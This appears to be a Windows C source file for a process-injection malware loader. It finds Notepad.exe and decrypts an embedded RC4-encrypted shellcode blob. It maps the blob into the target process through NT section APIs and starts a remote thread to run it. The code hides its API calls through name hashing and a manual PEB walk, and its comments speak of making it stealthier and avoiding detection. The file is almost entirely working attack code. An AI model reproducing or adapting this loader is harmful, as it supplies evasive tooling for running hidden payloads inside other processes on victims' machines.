#include "structs.h" // Used For Custom GetProcAddress Function
#include "peb.h"    //  Used For Custom GetModuleHandleW Function
#include "query.h" //   Used For NtQuerySystemInformation Function

#ifndef STRUCTS // If Structs.h Is included, Include Win internals
#include <winternl.h>
#endif // !STRUCTS

#define INTIAL_SEED 7 //  Seed For Hashing
#define CONTAINING_RECORD(address, type, field) \ ((type *)((PCHAR)(address) - (ULONG PTR)(&((type * )0)->field))
#define procname L"Notepad.exe" // Target Process, We Should Obsucate this

// Hashing Function For Normal Ascii Strings
DWORD JenAscii(IN PCHAR str) {
    SIZE_T index = 0;
    UINT32 hash = 0;
    SIZE_T Length = lstrlenA(str);
    while (index != Length) {
        hash += str[index++];
        hash += hash << INTIAL_SEED;
        hash ^= hash >> 6;
    }
    hash += hash << 3;
    hash ^= hash >> 11;
    hash += hash << 15;
    //printf("Hash 0f %s is 0x%08x\n", str, hash);
    return hash;
}

// Hashing Function For Wide Unicode Strings 
// i should Just Keep one Function and check if string is wide or ascii but ceebs
DWORD JenWide(IN PWCHAR str) {
    SIZE_T index = 0;
    UINT32 hash = 0;
    SIZE_T Length = lstrlenW(str);
    while (index != Length) {
        hash += str[index++];
        hash += hash << INTIAL_SEED;
        hash ^= hash >> 6;
    }
    hash += hash << 3;
    hash ^= hash >> 11;
    hash += hash << 15;
    return hash;
}

// Function For Using NTAPI To Get ProcessID, Stealthier
BOOL GetProcID(IN LPCWSTR szProcName, OUT DWORD* dwProcID) {
    FARPROC GetInfoAddress(IN HMODULE hModule, IN DWORD Proc_hash); 
                                        // Delcare Other Functions
    HMODULE handle(IN DWORD hashed);
    ULONG uReturnLen1 = NULL;
    ULONG uReturnLen2 = NULL;
    PSYSTEM_PROCESS_INFORMATION SystemProcInfo = NULL;
    PVOID pValueToFree = NULL;
    NTSTATUS STATUS = NULL;
    CONST DWORD module = 0x82acbbb8; // Hash Of NTDLL.DLL
    CONST DWORD query = 0xc91abebe;  // Hash Of NtQuerySystemInformation

    HMODULE hNTDLL = handle(module); // Get Handle To NTDLL
    _func_NtQuerySystemInformation pNtQuerySystem = (_func_NtQuerySystemInformation)GetInfoAddress(hNTDLL, query); // Get Address Of it
    printf("Query: 0x%p\n\n", pNtQuerySystem); // Debug get rid

    pNtQuerySystem(SystemProcessInformation, NULL, NULL, &uReturnLen1);

    // Allocate a Buffer In the Heap For the Return values
    SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)uReturnLen1); 
    if (SystemProcInfo == NULL) {
        printf("HeapAlloc Failed\tCode: %d", GetLastError());
        return FALSE;
    }
    pValueToFree = SystemProcInfo;

    STATUS = pNtQuerySystem(SystemProcessInformation, SystemProcInfo, uReturnLen1, &uReturnLen2);
    if (STATUS != STATUS_SUCCESS) {
        printf("Query Failed With Code: 0x%0.8x\n", STATUS);
        return FALSE;
    }

    while (TRUE) {
        // Compare Current .exe With Needed One and if they equal, return the ProcessID
        if (SystemProcInfo->ImageName.Length && wcscmp(SystemProcInfo->ImageName.Buffer, szProcName) == 0) {
            *dwProcID = (DWORD)SystemProcInfo->UniqueProcessId;
            break;
        }

        // Check If We Reached the end
        if (!SystemProcInfo->NextEntryOffset) {
            break;
        }
        // Move to the Next entry
        SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)SystemProcInfo + SystemProcInfo->NextEntryOffset);
    }
    
    // Free the Buffer we allocated In the Heap
    HeapFree(GetProcessHeap(), 0, pValueToFree);
    // Quick Check To see If we Found Or not
    if (*dwProcID == NULL) {
        return FALSE;
    }
    return TRUE;
}



// Function To Replace GetModuleHandleW
HMODULE handle(IN DWORD hashed) {
#ifdef _WIN64 // Check If Compiling as x64
    // Get The Process Enviroment Block
    PPEB pPeb = (PEB*)(__readgsqword(0x60));
#elif _WIN32 // Check If Compiling as x86
    // Get The Process enviroment Block
    PPEB pPeb = (PEB*)(__readfsqword(0x30));
#endif
    //PLDR_DATA_TABLE_ENTRY pDte = (PLDR_DATA_TABLE_ENTRY)(pPeb->Ldr->InMemoryOrderModuleList.Flink);
    PLDR_DATA_TABLE_ENTRY pDte = (PLDR_DATA_TABLE_ENTRY)(pPeb->Ldr->InInitializationOrderModuleList.Flink);


    // Get The Head Of the Linked List
    PLIST_ENTRY pListHead = (PLIST_ENTRY)&pPeb->Ldr->InMemoryOrderModuleList;
    // Get The End(node) of the linked list
    PLIST_ENTRY pListNode = (PLIST_ENTRY)pListHead->Flink;

    do {
        // Check If the Lenght Of module != NULL
        if (pDte->FullDllName.Length != NULL) {
            // Hash The Name Of It and then
            DWORD f_hash = JenWide(pDte->FullDllName.Buffer);

            // Compare the hash against the Inputted Hash
            if (f_hash == hashed) {
#ifdef  STRUCTS
                // Return The Address Of the Correct Module
                return (HMODULE)(pDte->InInitializationOrderLinks.Flink);
#else
                // This one is only Needed If we Arent Using the Current Technique, other one broke my code tho
                return (HMODULE)pDte->Reserved2[0];
#endif //  STRUCTS

            }

            // Point to The Next entry In Linked List
            pDte = (PLDR_DATA_TABLE_ENTRY)(pListNode->Flink);

            // Update the end(node) to be the next end(node)
            pListNode = (PLIST_ENTRY)(pListNode->Flink);
        }
    } while (pListNode != pListHead); // Loop While There are still elemants in the linked list

    return NULL;
}


// Decryption Function (Need To Swap This Out For a Custom Function cause detected)
BOOL Rc4EncryptionSystemFunction(IN PBYTE pRc4Key, IN PBYTE pShellcode, IN DWORD dwRc4KeySize, IN DWORD sShellSize) {
    NTSTATUS STATUS = NULL;

    // Make to USTRING  Varibales
    // One is passed as Key and Other Passed As Payload to encrypt/decrypt
    USTRING key = { .Buffer = pRc4Key, .Length = dwRc4KeySize, .MaximumLength = dwRc4KeySize },
        data = { .Buffer = pShellcode, .Length = sShellSize, .MaximumLength = sShellSize };
    HMODULE hAdvapi32 = LoadLibraryA("Advapi32.dll");

    //printf("0x%p\n", hAdvapi32);

    // Get Address Of SystemFunction032, For Some Reason the Custom GetProcAddress Function Doesnt work with this, the DLL structure might be differnet
    fnSystemFunction032 pSystemFunction32 = (fnSystemFunction032)GetProcAddress(hAdvapi32, "SystemFunction032");
    if (pSystemFunction32 == NULL) {
        printf("FAIL");
    }
    printf("0x%p\n", pSystemFunction32);
    if ((STATUS = pSystemFunction32(&data, &key)) != 0x0) {
        printf("[!] Failed With Code: 0x%0.08", STATUS);
        return FALSE;
    }
    return TRUE;
}

FARPROC GetInfoAddress(IN HMODULE hModule, IN DWORD Proc_hash) {
    // Save The Base Address Of Module
    PBYTE pBase = (PBYTE)hModule;

    // Find The Dos Header And Do a Check
    PIMAGE_DOS_HEADER pImgDos = (PIMAGE_DOS_HEADER)pBase;
    if (pImgDos->e_magic != IMAGE_DOS_SIGNATURE) {
        printf("Not a Valid Dos header");
        return NULL;
    }

    // Find The NT Header And Do a Check, e_lfanew points to it
    PIMAGE_NT_HEADERS pImgNT = (PIMAGE_NT_HEADERS)(pBase + pImgDos->e_lfanew);
    if (pImgNT->Signature != IMAGE_NT_SIGNATURE) {
        printf("Not a Valid NT Header");
        return NULL;
    }

    // Get The Option Header Address
    IMAGE_OPTIONAL_HEADER pImgOpt = pImgNT->OptionalHeader;


    PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + pImgOpt.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    // Save The Addresses Of Names, Functions And the Oridnals
    PDWORD FuncNameArray = (PDWORD)(pBase + pImgExportDir->AddressOfNames);
    PDWORD FuncAddrArray = (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);
    PWORD FuncOrdinalArray = (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);

    // Loop Through Each Function And Check if it == The Needed Function And If So
    for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++) {
        CHAR* pFuncName = (CHAR*)(pBase + FuncNameArray[i]); // Name Of Current Function
        DWORD hashed = JenAscii(pFuncName); // Hash The Current Function Name For comparing Against One we Want

        if (Proc_hash == hashed) {
            // Get and Return The Address Of the Current Function
            PVOID pFuncAddr = (PVOID)(pBase + FuncAddrArray[FuncOrdinalArray[i]]);
            return pFuncAddr;
        }
    }
    return NULL;
}


// RC4 Encrypted ShellCode (Shouldnt Store Payload in binary tho lol)
unsigned char code[] =
"\x3a\x59\xc9\xaf\xb5\x6c\xd8\xa8\xc1\xa4\x4d\x4a\x46\xb9"
"\x6c\xe7\x62\x3c\xe3\x91\x52\x58\x20\xc8\xd3\xd9\x05\xd3"
"\xed\xb7\x3a\x80\xe5\xf6\x95\x72\x35\x81\x25\xdd\xef\xb0"
"\x73\xe4\xff\x20\x3e\x95\xf6\x06\x36\x99\x68\x6f\xf4\x79"
"\x59\xc0\x8c\x8c\x1b\x0b\x0e\xa0\xe6\x3b\xbc\x99\x41\xfd"
"\xd4\x4d\xe2\x61\xa3\xf5\xee\xd2\x44\x9c\x17\x39\x5a\xb9"
"\x0c\x9a\x04\x57\x4b\x2d\x27\x6a\xb9\xe3\xbf\x23\x1c\xad"
"\x00\xb5\xd6\x61\x71\xba\x42\x1d\x31\x5a\xe6\x47\xe5\x6c"
"\xfc\x8c\x9d\xee\x61\xee\x70\x4d\xe4\x51\xb4\xa1\x8d\x3f"
"\x4a\x79\x90\x09\x72\xd4\x40\xb0\x35\xbf\xab\x82\xfb\x62"
"\x3c\xb3\x9f\xb9\xd7\xc8\x2e\xf3\x23\x68\x24\x55\x7a\x71"
"\xe9\x09\x43\x32\x56\x6b\xbc\x80\xde\x42\xc0\x83\x79\x8d"
"\x51\x14\x5a\xdd\x84\x24\xe0\xbd\xe8\xc3\x24\x6e\x93\x49"
"\x67\x0c\x21\xe2\x78\x44\x1b\x98\xf5\xce\xc2\x84\x08\xaf"
"\xfe\x86\xdf\xdd\xb6\x46\x26\x5d\x09\x6e\xbb\x57\xce\x31"
"\x4a\x1a\x13\x6f\x26\x3b\x7d\x7a\xe7\x6f\x5f\x01\x08\x75"
"\x8e\xbb\x5d\x3c\x5b\xc5\x39\x7b\xff\x80\x0e\xda\x55\x0a"
"\xdf\xd2\xa9\x10\x6f\xe7\x9e\xfc\x92\xf6\xf1\xe9\x2b\x96"
"\x37\x43\x6b\x05\x9c\xdb\xc4\xcb\xeb\x60\x57\xa3\x8f\x20"
"\x0c\x8b\x19\x35\xae\xb0\x7d\xf9\xed\x7e\x5e";

unsigned char key[] = {
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F // Key For Decryption, This Should be changed
};


int main(int argc, char* argv[]) {
    HANDLE hProc    = NULL;       //       Holds Handle To Process                     \\
    HANDLE hThread  = NULL;      //        Holds Handle To Thread We Create             \\
    HANDLE hFile    = NULL;     //         Holds Handle To The File Mapping We Create    \\
    PVOID  rBuffer  = NULL;    //          Holds Address Of the Payload In Remote Buffer  \\
    PVOID  lBuffer  = NULL;   //           Holds Address Of Local Buffer                   \\

    CONST DWORD module = 0x82acbbb8;
    CONST DWORD open = 0x616bcd2b;
    CONST DWORD Create = 0xefb55787;
                                    // Hashs Of Functions and DLL Names
    CONST DWORD Map = 0x20b4c85a; 
    CONST DWORD thread = 0x3c2d6449;
    CONST DWORD close = 0xa1775d8e;
    CONST DWORD Wait = 0x8541c085;
    HMODULE ndll = handle(module); // Get Handle to hNTDLL
   

    wprintf(L"Finding %s...\n", procname);
    DWORD pID = NULL;
    if (!GetProcID(procname, &pID)) { // Find Notepads Process ID
        printf("Fail");
        return EXIT_FAILURE;
    }
    wprintf(L"[*] Found %s [%ld]\n\n", procname, pID);

    
    OBJECT_ATTRIBUTES OA = { sizeof(OA), NULL };
                                                    // Needed For NtOpen And Other NTAPI Functions
    CLIENT_ID CID = { (HANDLE)pID, NULL };
    size_t code_len = sizeof(code);
    

    if (!Rc4EncryptionSystemFunction(key, code, sizeof(key), sizeof(code))) { // Decrypt the payload using the SystemFunction032
        printf("Failed Encrypting");
        return 1;
    }


    _func_NtOpenProcess pOpen = (_func_NtOpenProcess)GetInfoAddress(ndll, open); // Get Address Of NtOpenProcess By passing its hash
    printf("[NtOpen]\n       \\\____0x%p\n", pOpen);
    NTSTATUS status = pOpen(&hProc, PROCESS_ALL_ACCESS, &OA, &CID); // Get Handle To Notepad.exe
    if (status != STATUS_SUCCESS) {
        printf("Failed Getting Handle");
        return EXIT_FAILURE;
    }
    printf("[*] Got Handle\n        \\____0x%p\n\n", hProc);
    

    _func_NtCreateSection pCreate = (_func_NtCreateSection)GetInfoAddress(ndll, Create); // Get Address Of Create NtCreatesection (NTAPI Call Of CreateFileMapping)
    printf("[NtCreate]\n    \\\____0x%p\n\n", pCreate);

    // Create a Shared File Mapping
    status = pCreate(&hFile, SECTION_ALL_ACCESS, NULL, (PLARGE_INTEGER)&code_len, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
    if (status != STATUS_SUCCESS) {
        printf("Failed Creating Shared Map\n");
        return EXIT_FAILURE;
    }
    printf("[*] Created Shared File\n\n");

    

    _func_NtMapViewOfSection pMap = (_func_NtMapViewOfSection)GetInfoAddress(ndll, Map); // Get Address Of NtMapViewOfSection (NTAPI call of MapViewOfFile)
    printf("[NtMap]\n   \\\___0x%p\n", pMap);

    // Map The File Into Our Memory Space
    status = pMap(hFile, GetCurrentProcess(), &lBuffer, NULL, NULL, NULL, (SIZE_T*)&code_len, ViewUnmap, NULL, PAGE_READWRITE);
    if (status != STATUS_SUCCESS) {
        printf("Failed Allowing Local Access");
        return EXIT_FAILURE;
    }


    memcpy(lBuffer, code, code_len); // Copy The PayLoad Into the File Share (Need to Change This To NTAPI Function)
    printf("[+] Copied Payload\n\n");

    // Map The View Into The Remote Processes Memory Space
    status = pMap(hFile, hProc, &rBuffer, NULL, NULL, NULL, (SIZE_T*)&code_len, ViewUnmap, NULL, PAGE_EXECUTE_READ);
    if (status != STATUS_SUCCESS) {
        printf("Failed Allowing Remote\n");
        return EXIT_FAILURE;
    }
    printf("[*] Buffer Location\n   \\\____0x%p\n", rBuffer);

    _func_NtCreateThreadEx pThread = (_func_NtCreateThreadEx)GetInfoAddress(ndll, thread); // Get Address Of NtCreateThreadEx (NTAPI Call Of CreateRemoteThreadEx)
    printf("[NtThread]\n    \\\____0x%p\n", pThread);

    // Create a Thread Starting at the remote Buffer (Where Our PayLoad Is Stored)
    status = pThread(&hThread, THREAD_ALL_ACCESS, &OA, hProc, (PTHREAD_START_ROUTINE)rBuffer, NULL, 0, 0, 0, 0, NULL);
    if (status != STATUS_SUCCESS) {
        printf("Failed With Thread");
        return EXIT_FAILURE;
    }
    printf("[*] Started Thread\n    \\___0x%p\n", hThread);

    _func_NtWaitForSingleObject pWait = (_func_NtWaitForSingleObject)GetInfoAddress(ndll, Wait); // Get Address Of NtWaitForSingleObject
    status = pWait(hThread, FALSE, NULL); // Wait For Thread To Finish
    if (status != STATUS_SUCCESS) {
        return EXIT_FAILURE;
    }

    _func_NtClose pClose = (_func_NtClose)GetInfoAddress(ndll, close);
    // Get Address Of NtClose Then Close Our Handles
    pClose(hProc);
    pClose(hThread);

    return EXIT_SUCCESS;
}